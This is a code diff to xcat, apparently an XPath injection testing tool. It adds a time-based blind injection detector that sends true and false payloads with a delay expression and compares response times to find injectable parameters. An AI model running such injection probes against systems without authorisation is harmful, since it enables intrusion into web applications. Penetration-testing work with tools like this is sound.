@@ -1,9 +1,10 @@
 import asyncio
-from typing import List
 
 from xpath import E
 
-from xcat.attack import AttackContext, Injection, check
+import click
+
+from xcat.attack import AttackContext, Injection, check, timed_request
 
 injectors = [
     Injection('integer',
@@ -80,7 +81,7 @@ injectors = [
 ]
 
 
-async def detect_injections(context: 'AttackContext') -> List[Injection]:
+async def detect_injections(context: 'AttackContext') -> list[Injection]:
     working_value = context.target_parameter_value
 
     returner = []
@@ -98,3 +99,45 @@ async def detect_injections(context: 'AttackContext') -> List[Injection]:
             returner.append(injector)
 
     return returner
+
+
+async def detect_injections_timed(context: 'AttackContext') -> tuple[list[Injection], float]:
+    """Detect injections using timing oracle.
+
+    For each injector, sends true()+delay and false()+delay payloads.
+    True should be slow (delay evaluates), false should be fast (short-circuited).
+
+    Returns (detected_injections, calibrated_threshold).
+    """
+    working = context.target_parameter_value
+    delay = context.time_delay_expr
+
+    detected = []
+    best_true_time = 0.0
+    best_false_time = 0.0
+
+    for injector in injectors:
+        click.echo(f'  Testing: {injector.name}... ', nl=False)
+        try:
+            true_payload = str(injector(working, E(f"true() and {delay}")))
+            false_payload = str(injector(working, E(f"false() and {delay}")))
+        except Exception:
+            click.echo(click.style('skip', 'yellow'))
+            continue
+
+        false_time = await timed_request(context, false_payload)
+        true_time = await timed_request(context, true_payload)
+
+        click.echo(f'false={false_time:.2f}s, true={true_time:.2f}s', nl=False)
+
+        if true_time > false_time * 2 and true_time > 1.0:
+            click.echo(click.style(' ← detected', 'green'))
+            detected.append(injector)
+            if true_time > best_true_time:
+                best_true_time = true_time
+                best_false_time = false_time
+        else:
+            click.echo()
+
+    threshold = (best_true_time + best_false_time) / 2 if detected else 0.0
+    return detected, threshold
